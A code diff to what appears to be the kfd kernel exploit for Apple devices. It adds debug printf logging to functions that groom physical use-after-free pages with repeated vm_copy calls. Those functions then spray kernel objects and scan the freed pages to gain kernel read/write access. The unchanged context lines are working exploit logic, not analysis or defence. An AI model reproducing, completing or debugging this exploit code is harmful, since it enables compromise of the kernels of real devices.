@@ -172,8 +172,9 @@ bool krkw_helper_grab_free_pages(struct kfd* kfd)
     } else if (device_ram >= 1024 * 1024 * 1024 * 5ULL) { // 6GB/8GB devices
         grabbed_free_pages_max = 200000;
     }
-    print("RAM size: 0x%llx, free pages max: 0x%llx\n", device_ram, grabbed_free_pages_max);
+    printf("[ke] kfd: grab_free_pages start (puaf=%u goal=%llu max=%llu RAM=0x%llx)\n", kfd->puaf.number_of_puaf_pages, grabbed_puaf_pages_goal, grabbed_free_pages_max, device_ram);
 
+    u64 last_grabbed = 0;
     for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
         assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));
 
@@ -181,16 +182,17 @@ bool krkw_helper_grab_free_pages(struct kfd* kfd)
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
-                if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
-                    print_u64(grabbed_free_pages);
-                    //timer_end();
+                grabbed_puaf_pages++;
+                if (grabbed_puaf_pages == grabbed_puaf_pages_goal) {
+                    printf("[ke] kfd: grabbed %llu free pages after %llu vm_copy iterations\n", grabbed_puaf_pages, grabbed_free_pages / copy_pages);
                     return true;
                 }
             }
         }
+        last_grabbed = grabbed_puaf_pages;
     }
 
-    print_warning("failed to grab free pages goal (goal %llu, max %llu, RAM size 0x%llx)", grabbed_puaf_pages_goal, grabbed_free_pages_max, device_ram);
+    printf("[ke] kfd: grab_free_pages FAILED (last_grabbed=%llu goal=%llu)\n", last_grabbed, grabbed_puaf_pages_goal);
     return false;
 }
 
@@ -214,6 +216,7 @@ bool krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
             krkw->krkw_method_ops.allocate(kfd, krkw->krkw_allocated_id);
             krkw->krkw_allocated_id++;
         }
+        printf("[ke] kfd: krkw spray batch done (allocated=%llu max=%llu)\n", krkw->krkw_allocated_id, krkw->krkw_maximum_id);
 
         /*
          * Search the puaf pages for the last batch of objects.
@@ -230,10 +233,12 @@ bool krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
                 if (krkw->krkw_method_ops.search(kfd, object_uaddr)) {
                     krkw->krkw_searched_id = krkw->krkw_object_id;
                     krkw->krkw_object_uaddr = object_uaddr;
+                    printf("[ke] kfd: object found at 0x%llx (puaf page %u)\n", object_uaddr, i);
                     goto loop_break;
                 }
             }
         }
+        printf("[ke] kfd: search found nothing, allocated=%llu\n", krkw->krkw_allocated_id);
 
         krkw->krkw_searched_id = krkw->krkw_allocated_id;
 
@@ -242,6 +247,9 @@ loop_break:
             break;
         }
     }
+
+    bool found = (krkw->krkw_searched_id == krkw->krkw_object_id);
+    printf("[ke] kfd: run_allocate %s (allocated=%llu searched=%llu object_id=%llu)\n", found ? "ok" : "MISS", krkw->krkw_allocated_id, krkw->krkw_searched_id, krkw->krkw_object_id);
 
     //timer_end();
     const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";
